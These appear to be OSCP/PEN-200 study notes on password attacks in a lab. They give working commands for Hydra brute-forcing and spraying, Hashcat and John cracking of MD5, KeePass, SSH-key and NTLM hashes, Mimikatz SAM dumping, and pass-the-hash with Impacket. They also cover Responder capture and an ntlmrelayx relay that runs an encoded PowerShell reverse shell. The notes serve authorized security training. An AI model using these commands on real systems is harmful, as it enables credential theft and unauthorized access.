---
title: "PEN-200 Chapter 13 - Password Attacks"
aliases:
  - "PEN-200 Ch13 Password Attacks"
  - "OSCP Password Attacks"
tags:
  - oscp
  - pen-200
  - password-attacks
  - hydra
  - hashcat
  - john-the-ripper
  - mimikatz
  - ntlm
  - net-ntlmv2
  - responder
  - impacket
source: "PEN-200 Chapter 13 - Password Attacks"
chapter: 13
---

# PEN-200 Chapter 13 — Password Attacks

> [!info] Scope
> This note summarizes **all sections and subsections of Chapter 13** and keeps the commands, tools, rule files, hashes, and code/command examples used in the chapter. It is written for authorized PEN-200/OSCP lab use.

## Chapter map

- **13.1 Attacking Network Services Logins**
  - 13.1.1 SSH and RDP
  - 13.1.2 HTTP POST Login Form
- **13.2 Password Cracking Fundamentals**
  - 13.2.1 Introduction to Encryption, Hashes and Cracking
  - 13.2.2 Mutating Wordlists
  - 13.2.3 Cracking Methodology
  - 13.2.4 Password Manager
  - 13.2.5 SSH Private Key Passphrase
- **13.3 Working with Password Hashes**
  - 13.3.1 Cracking NTLM
  - 13.3.2 Passing NTLM
  - 13.3.3 Cracking Net-NTLMv2
  - 13.3.4 Relaying Net-NTLMv2
- **13.4 Wrapping Up**

---

# Attack-chain connection

The chapter sits mainly in the **Credentials** stage, but password attacks connect several phases of an OSCP-style compromise:

```text
Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof
```

- **Recon / Enumeration:** discover exposed SSH, RDP, HTTP, SMB, usernames, installed password managers, password policies, local accounts, and possible authentication mechanisms.
- **Initial Access:** use recovered or guessed credentials against SSH, RDP, or web login forms.
- **Privilege Escalation:** privileged Windows access enables credential extraction with Mimikatz; conversely, cracked credentials may also give access to a more privileged account.
- **Credentials:** the core of the chapter—dictionary attacks, password spraying, offline cracking, KeePass cracking, SSH key passphrase cracking, NTLM extraction, and Net-NTLMv2 capture.
- **Pivoting / Lateral Movement:** reuse plaintext passwords, pass NTLM hashes, or relay Net-NTLMv2 authentication to another host.
- **AD:** Chapter 13 focuses on local Windows systems, but NTLM/Net-NTLMv2 concepts are direct prerequisites for later Active Directory attacks.
- **Proof:** confirm access by logging in, opening protected data, obtaining a shell, checking `whoami`, `hostname`, and documenting the credential path.

> [!tip] OSCP mindset
> Password attacks are rarely isolated. A username found during enumeration can enable Hydra; a password from one host can be sprayed elsewhere; a hash from a privileged host can enable lateral movement; and a captured Net-NTLMv2 authentication may be cracked or relayed.

---

# 13.1 Attacking Network Services Logins

The chapter begins with online password attacks against services. It distinguishes:

- **Brute force:** tries every possible password combination.
- **Dictionary attack:** tries candidates from a wordlist such as `rockyou.txt`.
- **Password spraying:** tries one known password against many usernames.

Dictionary attacks are much faster than exhaustive brute force when users choose common passwords, but they fail if the correct password is not represented by the candidate list.

Online attacks are **noisy** and may cause account lockouts, trigger WAF/IDS controls, or disrupt production systems. Enumeration should come first.

## 13.1.1 SSH and RDP

### Tools

- **Nmap** — verify that the expected network service is actually listening.
- **THC Hydra** — perform online password attacks against many protocols.
- **rockyou.txt** — common password wordlist included with Kali, usually compressed initially.

### Confirm the SSH service

```bash
sudo nmap -sV -p 2222 192.168.50.201
```

Arguments:

- `sudo` — run with elevated privileges.
- `nmap` — network scanner.
- `-sV` — perform service/version detection.
- `-p 2222` — scan only TCP port 2222.
- `192.168.50.201` — target host.

Why: before launching a password attack, verify that the service exists and that the port/protocol assumption is correct.

### Prepare `rockyou.txt`

```bash
cd /usr/share/wordlists/
ls
sudo gzip -d rockyou.txt.gz
```

Explanation:

- `cd /usr/share/wordlists/` — move to Kali's common wordlist directory.
- `ls` — list available wordlists.
- `gzip -d rockyou.txt.gz` — decompress the Gzip archive.
- `-d` — decompress instead of compress.

### SSH dictionary attack with Hydra

```bash
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

Arguments:

- `-l george` — test a **single username**, `george`.
- `-P /usr/share/wordlists/rockyou.txt` — use a **password list**.
- `-s 2222` — override the protocol's default port and use 2222.
- `ssh://192.168.50.201` — use the SSH module against this host.

Result in the chapter:

```text
login: george
password: chocolate
```

When to use: a valid or likely username is known and an exposed SSH service is available.

### Password spraying against RDP

```bash
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

Arguments:

- `-L <file>` — test **many usernames** from a file.
- `-p "SuperS3cure1337#"` — test one specific password.
- `rdp://192.168.50.202` — use Hydra's RDP module.

Chapter result:

```text
daniel : SuperS3cure1337#
justin : SuperS3cure1337#
```

This is **password spraying**: one credential candidate is reused across many accounts.

### Key lessons

- If you know a username, use a focused dictionary attack rather than blindly attacking everything.
- If you obtain a plaintext password, try it carefully against other plausible accounts/systems.
- Built-in accounts such as `root` or `Administrator` can be candidates when appropriate.
- Online guessing creates logs, traffic, and potentially account lockouts.
- In PEN-200 exercises, an authentication attack that runs much longer than expected may indicate a wrong command, wrong arguments, or wrong approach.

---

## 13.1.2 HTTP POST Login Form

Web login forms require more information than SSH/RDP because Hydra must know:

1. the login endpoint;
2. the POST body;
3. how to recognize a **failed login**.

### Tool: Burp Suite

Burp is used to intercept an HTTP login request so that the exact POST parameters can be copied.

Workflow:

1. Enable Burp intercept.
2. Submit a test login.
3. Record the POST request body.
4. Forward the request or disable intercept.
5. Record text that reliably appears only after a failed login.

For the TinyFileManager example, the relevant POST fields are:

```text
fm_usr=user&fm_pwd=<password>
```

Hydra uses `^PASS^` as the password placeholder.

### Hydra HTTP POST form attack

```bash
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 \
http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Arguments:

- `-l user` — single username.
- `-P .../rockyou.txt` — password candidate list.
- `192.168.50.201` — web server target; the module is specified separately.
- `http-post-form` — Hydra module for POST-based login forms.
- `"/index.php:...:..."` — three colon-separated fields:
  1. `/index.php` — login path.
  2. `fm_usr=user&fm_pwd=^PASS^` — POST request body.
  3. `Login failed. Invalid` — failure-condition string.

Chapter result:

```text
user : 121212
```

### Why the failure string matters

Hydra checks the HTTP response for the failure-condition text. If the text is present, Hydra assumes the login failed.

Avoid overly generic condition strings such as just `password` or `username`, because they may also appear in successful responses and create false positives.

### Defensive/operational considerations

- A WAF may detect and block repeated form submissions.
- Tools such as `fail2ban` may lock accounts after multiple failures.
- Web applications sometimes lack strong brute-force controls, making login forms useful targets—but only after considering lockout/noise risks.

---

# 13.2 Password Cracking Fundamentals

This unit moves from **online guessing** to **offline cracking**.

Offline cracking is attractive because it:

- does not consume target network bandwidth;
- does not lock user accounts;
- is not directly blocked by traditional network controls;
- can run in parallel with other penetration-testing work.

The main tools are:

- **Hashcat**
- **John the Ripper (JtR)**

---

## 13.2.1 Introduction to Encryption, Hashes and Cracking

### Encryption vs hashing

**Encryption** is reversible if the correct key is known.

- **Symmetric encryption:** same key for encryption/decryption; AES is an example.
- **Asymmetric encryption:** public/private key pair; RSA is an example.

**Hashing** is designed to be one-way.

A password is passed through a hash algorithm, producing a fixed-length digest. Authentication systems can hash a submitted password and compare it to the stored hash.

Examples discussed:

- MD5
- SHA1
- SHA-256

### Manual SHA-256 demonstration

```bash
echo -n "secret" | sha256sum
echo -n "secret" | sha256sum
echo -n "secret1" | sha256sum
```

Important arguments/operators:

- `echo -n` — print the string **without a trailing newline**. A newline would change the hash.
- `|` — pipe the string into the next command.
- `sha256sum` — calculate SHA-256.

The same plaintext produces the same unsalted hash. In the chapter, the target SHA-256 matched `secret1`.

### Hashcat vs John the Ripper

**Hashcat**

- optimized primarily for GPU cracking;
- can also use CPUs;
- GPU use requires OpenCL/CUDA support.

**John the Ripper**

- traditionally CPU-friendly;
- also supports GPU acceleration;
- can handle formats/ciphers that Hashcat may not support.

For many fast hash algorithms, GPUs are substantially faster. Some deliberately slow algorithms such as bcrypt behave differently and can reduce the GPU advantage.

---

### Keyspace and cracking time

General formula:

```text
Cracking time ≈ keyspace / hash rate
```

For a character set of:

- 26 lowercase
- 26 uppercase
- 10 digits

the total character set is **62**.

Count it:

```bash
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
```

Arguments:

- `wc -c` — count characters/bytes from input.
- `echo -n` — prevent the newline from being counted.

Result:

```text
62
```

Calculate a five-character keyspace:

```bash
python3 -c "print(62**5)"
```

- `python3 -c` — execute Python code supplied as a string.
- `**` — exponentiation.

Result:

```text
916132832
```

### Benchmark Hashcat

CPU example:

```bash
hashcat -b
```

Windows/GPU example:

```powershell
hashcat.exe -b
```

- `-b` — benchmark mode.

Values shown in the chapter:

| Algorithm | GPU | CPU |
|---|---:|---:|
| MD5 | 68,185.1 MH/s | 450.8 MH/s |
| SHA1 | 21,528.2 MH/s | 298.3 MH/s |
| SHA-256 | 9,276.3 MH/s | 134.2 MH/s |

`MH/s` = millions of hashes per second.

### Calculate cracking time

Five-character SHA-256 keyspace on the example CPU:

```bash
python3 -c "print(916132832 / 134200000)"
```

Example GPU:

```bash
python3 -c "print(916132832 / 9276300000)"
```

Eight-character keyspace:

```bash
python3 -c "print(62**8)"
python3 -c "print(218340105584896 / 9276300000)"
```

Ten-character keyspace:

```bash
python3 -c "print(62**10)"
python3 -c "print(839299365868340224 / 9276300000)"
```

Chapter conclusions:

- 5 characters: trivial on modern hardware.
- 8 characters: around 6.5 hours for the demonstrated SHA-256 GPU rate.
- 10 characters: around 2.8 years at that rate.

A major point is that increasing password **length** has a dramatic effect on keyspace.

---

## 13.2.2 Mutating Wordlists

Password policies often require:

- uppercase;
- lowercase;
- digits;
- special characters;
- minimum length.

Common wordlists may not directly satisfy these policies. **Rule-based attacks** mutate existing words based on likely human behavior instead of generating every possible string.

### Inspect `rockyou.txt`

```bash
head /usr/share/wordlists/rockyou.txt
```

`head` displays the first 10 lines by default.

### Create a small demonstration list

```bash
mkdir passwordattacks
cd passwordattacks
head /usr/share/wordlists/rockyou.txt > demo.txt
```

- `mkdir passwordattacks` — create a working directory.
- `>` — redirect output into a file, overwriting it.

Remove lines starting with `1`:

```bash
sed -i '/^1/d' demo.txt
cat demo.txt
```

`sed` expression:

- `^1` — match lines beginning with `1`.
- `d` — delete matching lines.
- `-i` — edit the file in place.

### Hashcat rule functions

Important rule functions introduced:

```text
$X    append character X
^X    prepend character X
c     capitalize first character, lowercase the rest
```

Example: prepend `3`:

```text
^3
```

Example: append `1`:

```text
$1
```

Create the rule file:

```bash
echo \$1 > demo.rule
```

The `$` is escaped so the shell writes it literally.

Preview mutations without cracking:

```bash
hashcat -r demo.rule --stdout demo.txt
```

Arguments:

- `-r demo.rule` — apply rules from the specified rule file.
- `--stdout` — print generated candidates instead of cracking.

Example output:

```text
password1
iloveyou1
princess1
rockyou1
abc1231
```

### Multiple rule functions: same line vs separate lines

`demo1.rule`:

```text
$1 c
```

Run:

```bash
hashcat -r demo1.rule --stdout demo.txt
```

Because both functions are on one line, both are applied to each candidate:

```text
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231
```

`demo2.rule`:

```text
$1
c
```

Each line is a separate rule, so Hashcat generates separate mutations.

### Add a special character

`demo1.rule`:

```text
$1 c $!
```

```bash
hashcat -r demo1.rule --stdout demo.txt
```

Output pattern:

```text
Password1!
Iloveyou1!
Princess1!
...
```

Alternative:

```text
$! $1 c
```

This generates:

```text
Password!1
Iloveyou!1
...
```

Rule functions are processed **left to right**.

### Rule-based MD5 cracking

Hash file:

```bash
cat crackme.txt
```

Contents:

```text
f621b6c9eab51a3e2f4e167fee4c6860
```

Rules:

```bash
cat demo3.rule
```

```text
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

Crack:

```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

Arguments:

- `-m 0` — Hashcat mode 0 = MD5.
- `crackme.txt` — target hash file.
- `rockyou.txt` — base wordlist.
- `-r demo3.rule` — apply custom mutations.
- `--force` — ignore certain platform/driver warnings. Use carefully; it does not fix incorrect attack logic.

Recovered password:

```text
Computer123!
```

### Why custom rules work

Human behavior is predictable:

- capitalize the first character;
- append a digit;
- append common symbols;
- reuse a base word and minimally change it to satisfy policy.

This means a targeted rule set can be much more efficient than blind brute force.

### Built-in Hashcat rules

List them:

```bash
ls -la /usr/share/hashcat/rules/
```

Examples included by Hashcat:

```text
best64.rule
combinator.rule
d3ad0ne.rule
dive.rule
generated.rule
Incisive-leetspeak.rule
leetspeak.rule
rockyou-30000.rule
specific.rule
...
```

Use built-in rules when you lack exact policy information. If the target password policy is known, custom rules can be more focused.

> [!note]
> If Hashcat reports `Not enough allocatable device memory for this attack`, the chapter recommends increasing the Kali VM memory; 4 GB is sufficient for the demonstrated exercises.

---

## 13.2.3 Cracking Methodology

The chapter gives a five-step process:

1. **Extract hashes**
2. **Format hashes**
3. **Calculate cracking time**
4. **Prepare wordlist**
5. **Attack the hash**

### 1. Extract hashes

Possible sources include:

- database tables;
- password-manager files;
- SSH private keys;
- Windows SAM/LSASS;
- captured network authentication.

### 2. Format hashes

The cracking tool must receive the exact expected format.

Tools mentioned for identification:

```bash
hash-identifier
hashid
```

Use helper conversion tools when the source is a file format rather than a directly crackable hash.

### 3. Calculate cracking time

Estimate feasibility:

```text
time = keyspace / hash rate
```

If cracking is likely to exceed the remaining engagement time, try:

- better intelligence;
- better rules;
- another attack vector;
- faster hardware;
- a GPU/cloud cracking host where permitted.

### 4. Prepare the wordlist

Prefer targeted/rule-based cracking over blindly trying raw wordlists.

Investigate:

- target password policy;
- usernames and organization names;
- known user habits;
- leaked credentials;
- old passwords;
- default vendor policies.

### 5. Attack the hash

Before running a long job, verify:

- hash copied correctly;
- no accidental whitespace/newline;
- correct hash algorithm/mode;
- correct transformation format.

A 32-hex-character digest could represent more than one algorithm. Do not trust automatic identification blindly—corroborate with context.

---

## 13.2.4 Password Manager

Password managers protect many stored credentials behind one **master password**. If a password-manager database is obtained, cracking the master password can expose all stored accounts.

The chapter demonstrates KeePass.

### Locate KeePass databases on Windows

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Arguments:

- `Get-ChildItem` — enumerate files/directories.
- `-Path C:\` — start from the entire C: drive.
- `-Include *.kdbx` — only KeePass database files.
- `-File` — return files.
- `-Recurse` — search subdirectories.
- `-ErrorAction SilentlyContinue` — suppress access-denied and similar errors and continue.

Found in the chapter:

```text
C:\Users\jason\Documents\Database.kdbx
```

Transfer the `.kdbx` file to Kali.

### Convert KeePass database for cracking

```bash
ls -la Database.kdbx
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
```

`keepass2john` is part of the John the Ripper suite and converts the database into a crackable hash representation.

The generated line begins with:

```text
Database:$keepass$...
```

For Hashcat, remove the leading filename label:

```text
Database:
```

so the file begins directly with:

```text
$keepass$...
```

### Identify the Hashcat mode

```bash
hashcat --help | grep -i "KeePass"
```

Result:

```text
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
```

### Crack the KeePass master password

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

Arguments:

- `-m 13400` — KeePass mode.
- `keepass.hash` — converted database hash.
- `rockyou.txt` — base wordlist.
- `-r rockyou-30000.rule` — Hashcat rule set designed to work well with `rockyou.txt`.
- `--force` — ignore platform warnings in the lab environment.

Recovered master password:

```text
qwertyuiop123!
```

After opening the database with the recovered master password, all stored credentials become accessible.

### OSCP relevance

A `.kdbx` file found after initial access can be a high-value credential target. Always search user documents, backups, shares, and application data for password-manager databases.

---

## 13.2.5 SSH Private Key Passphrase

A stolen SSH private key may still be encrypted with a passphrase. The goal is to transform the key into a crackable representation and attack the passphrase offline.

The scenario begins with an `id_rsa` file and a `note.txt` file obtained from a web file manager.

### Inspect the user's password notes

```bash
cat note.txt
```

Chapter content:

```text
Dave's password list:
Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital
letter and a special character
```

This is valuable because it reveals:

- base password choices;
- a recurring number pattern: `137`;
- capitalization behavior;
- the exact new password policy.

### Try the private key

Set secure permissions:

```bash
chmod 600 id_rsa
```

- owner can read/write;
- no permissions for group/others;
- OpenSSH rejects overly permissive private keys.

Connect:

```bash
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

Arguments:

- `-i id_rsa` — private key identity file.
- `-p 2222` — SSH port.
- `dave@...` — username and target.

The known plaintext candidates did not unlock the key.

### Convert SSH key to a crackable hash

```bash
ssh2john id_rsa > ssh.hash
cat ssh.hash
```

`ssh2john` is a JtR helper script that converts the private key into JtR/Hashcat-compatible hash material.

The output includes a prefix like:

```text
id_rsa:$sshng$6$...
```

Remove `id_rsa:` before using the hash with Hashcat.

### Determine Hashcat SSH private-key mode

```bash
hashcat -h | grep -i "ssh"
```

Relevant result:

```text
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key
```

The chapter associates `$6$` with the matching Hashcat mode `22921`.

### Create targeted rules

`ssh.rule`:

```text
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Interpretation:

- `c` — capitalize the first letter.
- `$1 $3 $7` — append `137`.
- `$!`, `$@`, `$#` — append a likely special character.

Create a focused wordlist:

```bash
cat ssh.passwords
```

```text
Window
rickc137
dave
superdave
megadave
umbrella
```

### Hashcat attempt

```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

The chapter's key result:

```text
Token length exception
No hashes loaded.
```

Research indicates the key uses a modern cipher combination not supported by that Hashcat mode. This demonstrates an important lesson: **change tools when the format is unsupported**.

### Convert the rules for John the Ripper

Add a JtR rule-section header:

```text
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Append it to JtR's configuration:

```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

Why `sudo sh -c` is useful: the shell performing `>>` must have permission to write to `/etc/john/john.conf`.

### Crack with John

```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

Arguments:

- `--wordlist=ssh.passwords` — focused candidate list.
- `--rules=sshRules` — apply the named custom rule section.
- `ssh.hash` — transformed SSH key hash.

Recovered passphrase:

```text
Umbrella137!
```

John suggests this command to display cracked results reliably:

```bash
john --show ssh.hash
```

### Use the cracked key

```bash
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

Enter:

```text
Umbrella137!
```

The connection succeeds.

### Core lesson

Password cracking is not just "run rockyou." The strongest result came from:

```text
user password history + known password policy + targeted rules + correct cracking tool
```

---

# 13.3 Working with Password Hashes

This unit focuses on Windows credential material:

- **NTLM** hashes stored locally/cached.
- **Net-NTLMv2** network challenge-response authentication.

The chapter then uses them in four ways:

1. crack NTLM;
2. pass NTLM without cracking;
3. capture and crack Net-NTLMv2;
4. relay Net-NTLMv2 without cracking.

> [!important]
> Chapter 13 performs these demonstrations on local/non-domain Windows systems. The same concepts become building blocks for later Active Directory material.

---

## 13.3.1 Cracking NTLM

### SAM, NTLM, and salts

Local Windows password hashes are stored in the **Security Account Manager (SAM)** database.

Historical LM hashes are weak and obsolete on modern Windows.

Modern Windows uses NTLM hashes for local password storage. Important property for attack purposes:

- NTLM hashes in the SAM are **not salted**.

A salt is random data added before hashing. Salts prevent simple precomputed hash lookups such as rainbow-table attacks.

### Why Mimikatz is needed

The live SAM file is locked by Windows, so it cannot simply be copied while the OS is running.

**Mimikatz** can extract:

- plaintext credentials in some situations;
- NTLM hashes;
- credentials from LSASS;
- SAM hashes;
- tokens.

Mimikatz requires elevated privileges for sensitive operations.

Relevant Windows privilege:

```text
SeDebugPrivilege
```

LSASS runs as `SYSTEM`, so the chapter elevates to SYSTEM before dumping the SAM.

### Enumerate local users

```powershell
Get-LocalUser
```

This revealed a local user named `nelly`.

### Start Mimikatz

```powershell
cd C:\tools
ls
.\mimikatz.exe
```

### Mimikatz commands

Enable debug privilege:

```text
privilege::debug
```

Elevate token:

```text
token::elevate
```

Dump SAM hashes:

```text
lsadump::sam
```

Another important command mentioned:

```text
sekurlsa::logonpasswords
```

- `sekurlsa::logonpasswords` attempts to obtain credentials/hashes from LSASS-related sources.
- `lsadump::sam` is more focused on SAM hashes.

Chapter result for `nelly`:

```text
3ae8e5f0ffabb3a627672e1600f1ba10
```

Save it:

```bash
cat nelly.hash
```

```text
3ae8e5f0ffabb3a627672e1600f1ba10
```

### Find the Hashcat NTLM mode

```bash
hashcat --help | grep -i "ntlm"
```

Relevant modes:

```text
5500  NetNTLMv1 / NetNTLMv1+ESS
5600  NetNTLMv2
1000  NTLM
```

For a SAM NTLM hash:

```text
mode 1000
```

### Crack the NTLM hash

```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule --force
```

Arguments:

- `-m 1000` — NTLM.
- `nelly.hash` — hash file.
- `rockyou.txt` — base wordlist.
- `best64.rule` — 64 commonly effective Hashcat transformations.
- `--force` — ignore environment warnings in the lab.

Recovered password:

```text
nicole1
```

The chapter confirms it by logging in with RDP.

---

## 13.3.2 Passing NTLM

If an NTLM hash is too difficult to crack, it may still be usable directly through **pass-the-hash (PtH)**.

### Why pass-the-hash works

NTLM password hashes:

- are not salted;
- remain static across sessions for the same password;
- can be accepted by protocols/tools that support NTLM hash authentication.

If the same local Administrator password is reused across hosts, a hash captured on one system may authenticate to another.

For remote code execution, the account must have appropriate privileges on the target.

### UAC remote restrictions

For non-built-in local Administrator accounts, Windows UAC remote restrictions can prevent remote administrative execution.

The built-in local `Administrator` account is an important exception in the scenario.

### Extract the Administrator NTLM hash

In Mimikatz:

```text
privilege::debug
token::elevate
lsadump::sam
```

Chapter Administrator hash:

```text
7a38310ea6f0027ee955abed1762964b
```

### Tools supporting NTLM hash authentication

Mentioned in the chapter:

- `smbclient`
- CrackMapExec
- Impacket `psexec.py`
- Impacket `wmiexec.py`
- RDP-capable tools in suitable configurations
- WinRM-capable tools
- Mimikatz

### Access an SMB share with the NTLM hash

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash \
7a38310ea6f0027ee955abed1762964b
```

Arguments:

- `\\\\192.168.50.212\\secrets` — UNC share path, escaped for the shell.
- `-U Administrator` — username.
- `--pw-nt-hash` — treat the supplied credential as an NT hash.

Inside `smbclient`:

```text
dir
get secrets.txt
```

- `dir` — list remote share contents.
- `get secrets.txt` — download a remote file.

### Obtain SYSTEM shell with Impacket PsExec

```bash
impacket-psexec -hashes \
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \
Administrator@192.168.50.212
```

`-hashes` format:

```text
LMHash:NTHash
```

The chapter does not use an LM hash, so it supplies 32 zeros:

```text
00000000000000000000000000000000
```

Target syntax:

```text
username@ip
```

With no command specified at the end, `psexec` launches `cmd.exe`.

Verification commands:

```cmd
hostname
ipconfig
whoami
exit
```

`psexec` result:

```text
nt authority\system
```

### Obtain a shell as the authenticated user with WMIExec

```bash
impacket-wmiexec -hashes \
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \
Administrator@192.168.50.212
```

Verify:

```cmd
whoami
```

Result:

```text
files02\administrator
```

Difference emphasized by the chapter:

- `impacket-psexec` → commonly gives a **SYSTEM** shell.
- `impacket-wmiexec` → executes as the **authenticated user**.

---

## 13.3.3 Cracking Net-NTLMv2

An unprivileged shell may not allow Mimikatz. In that case, Windows network authentication can sometimes be induced so that **Net-NTLMv2** challenge-response material is captured.

### NTLM vs Net-NTLMv2

Do not confuse:

- **NTLM hash** — local password hash representation.
- **Net-NTLMv2** — network challenge-response authentication data.

The latter is captured during an authentication attempt and can sometimes be cracked offline.

### Tool: Responder

Responder can:

- run an SMB server;
- capture Net-NTLMv2 authentication;
- support other protocols such as HTTP/FTP;
- perform LLMNR/NBT-NS/MDNS poisoning.

This section focuses only on using the built-in SMB server to capture authentication.

### Check the unprivileged shell

Connect to a bind shell:

```bash
nc 192.168.50.211 4444
```

Commands on Windows:

```cmd
whoami
net user paul
```

`net user paul` shows account details and group memberships. The chapter confirms `paul` is not a local administrator.

### Identify the Kali interface

```bash
ip a
```

Example interface:

```text
tap0
192.168.119.2/24
```

### Start Responder

```bash
sudo responder -I tap0
```

Arguments:

- `sudo` — required for privileged raw socket/protocol operations.
- `-I tap0` — listen on the specified interface.

Confirm that the SMB server is enabled.

### Force an SMB authentication

From the Windows shell:

```cmd
dir \\192.168.119.2\test
```

`test` does not need to exist. The important action is that Windows attempts to authenticate to the SMB server controlled by the tester.

Responder captures a Net-NTLMv2 string such as:

```text
paul::FILES01:<challenge>:<response>:<blob>
```

Save it to:

```bash
cat paul.hash
```

### Find the correct mode

```bash
hashcat --help | grep -i "ntlm"
```

Net-NTLMv2 is:

```text
5600
```

### Crack the captured Net-NTLMv2

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

Recovered password:

```text
123Password123
```

The chapter validates the credential by connecting through RDP.

### Other coercion idea mentioned

If direct code execution is unavailable, a Windows application that accepts UNC paths may be induced to request a remote resource, e.g.:

```text
\\192.168.119.2\share\nonexistent.txt
```

If the application tries SMB access, Windows may initiate authentication to the tester-controlled server.

---

## 13.3.4 Relaying Net-NTLMv2

If the captured Net-NTLMv2 cannot be cracked, it may be possible to **relay** the live authentication attempt to another system.

Instead of learning the password, the attacker forwards the authentication exchange to another host.

### Conditions emphasized by the chapter

- The relayed user must be valid on the target.
- For command execution, the relayed account needs sufficient privileges.
- UAC remote restrictions can block remote administrative execution for local administrator accounts other than the built-in `Administrator`, unless restrictions are disabled.

### Tool: `ntlmrelayx`

`ntlmrelayx` is part of Impacket and can:

- receive an incoming authentication;
- relay it to another host/service;
- perform an action if authentication succeeds.

### Start the relay

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 \
-c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

Arguments:

- `--no-http-server` — disable the HTTP listener because this scenario uses SMB.
- `-smb2support` — enable SMB2 support.
- `-t 192.168.50.212` — relay to this target.
- `-c "<command>"` — command to execute after successful relayed authentication.
- `powershell -enc ...` — run a Base64-encoded PowerShell command. The chapter intentionally shortens the payload text in the listing.

### Start the reverse-shell listener

```bash
nc -nvlp 8080
```

Arguments:

- `-n` — no DNS resolution.
- `-v` — verbose.
- `-l` — listen mode.
- `-p 8080` — listen on port 8080.

### Connect to the bind shell

```bash
nc 192.168.50.211 5555
```

Check identity:

```cmd
whoami
```

Chapter user:

```text
files01\files02admin
```

Trigger SMB authentication:

```cmd
dir \\192.168.119.2\test
```

`ntlmrelayx` relays the authentication to FILES02. In the demonstrated lab, authentication succeeds and the supplied PowerShell command executes.

### Verify the reverse shell

Commands in the received shell:

```powershell
whoami
hostname
ipconfig
```

Result:

```text
whoami   -> nt authority\system
hostname -> FILES02
```

### Core lesson

For captured Net-NTLMv2 authentication, ask two questions:

```text
Can I crack it?
If not, can I relay the authentication somewhere useful?
```

Cracking recovers reusable plaintext. Relaying may provide immediate access without ever knowing the password.

---

# 13.4 Wrapping Up

Chapter 13 ties together multiple credential attack paths:

1. **Online attacks**
   - SSH
   - RDP
   - HTTP POST forms
   - dictionary attacks
   - password spraying

2. **Offline cracking**
   - hashing/encryption fundamentals
   - Hashcat/JtR
   - keyspace and hash-rate calculations
   - wordlist mutation
   - rules
   - cracking methodology

3. **Credential files**
   - KeePass `.kdbx`
   - SSH private keys

4. **Windows credentials**
   - NTLM extraction and cracking
   - pass-the-hash
   - Net-NTLMv2 capture and cracking
   - Net-NTLMv2 relay

The major OSCP lesson is that compromise often comes from **credential reuse and authentication weaknesses rather than a software exploit**.

---

# Tool index

## Nmap

Purpose: confirm services before attacking authentication.

```bash
sudo nmap -sV -p <port> <target>
```

Useful flags:

- `-sV` — service/version detection.
- `-p` — explicit port.

---

## THC Hydra

Purpose: online password guessing/spraying.

Single user, many passwords:

```bash
hydra -l <user> -P <wordlist> <protocol>://<target>
```

Many users, one password:

```bash
hydra -L <users.txt> -p '<password>' <protocol>://<target>
```

HTTP form:

```bash
hydra -l <user> -P <wordlist> <target> \
http-post-form "/path:user=<user>&pass=^PASS^:<failure-string>"
```

Important:

- `-l` — one username.
- `-L` — username list.
- `-p` — one password.
- `-P` — password list.
- `-s` — non-default service port.

---

## Burp Suite

Purpose: inspect the exact web authentication request/response.

Use it to collect:

- request path;
- parameter names;
- POST body;
- reliable login failure indicator.

---

## Hashcat

Purpose: high-speed offline password cracking and rule generation.

Benchmark:

```bash
hashcat -b
```

Preview rules:

```bash
hashcat -r <rulefile> --stdout <wordlist>
```

General cracking form:

```bash
hashcat -m <mode> <hashfile> <wordlist> -r <rulefile>
```

Modes used in this chapter:

```text
0      MD5
1000   NTLM
5600   NetNTLMv2
13400  KeePass
22921  OpenSSH private key ($6$) — attempted in chapter
```

---

## John the Ripper

Purpose: offline cracking; useful when Hashcat does not support a format/cipher.

```bash
john --wordlist=<file> --rules=<RuleName> <hashfile>
john --show <hashfile>
```

Transformation helpers used:

```bash
keepass2john Database.kdbx > keepass.hash
ssh2john id_rsa > ssh.hash
```

---

## Mimikatz

Purpose: extract Windows credential material after obtaining sufficient privilege.

Commands used/mentioned:

```text
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
```

Typical prerequisite: Administrator/SYSTEM-level access and `SeDebugPrivilege`.

---

## smbclient

Purpose: interact with SMB shares, including pass-the-hash-capable authentication.

```bash
smbclient \\\\<target>\\<share> -U <user> --pw-nt-hash <NTHash>
```

Interactive commands:

```text
dir
get <file>
```

---

## Impacket PsExec / WMIExec

Pass-the-hash syntax:

```bash
impacket-psexec -hashes <LMHash>:<NTHash> <user>@<target>
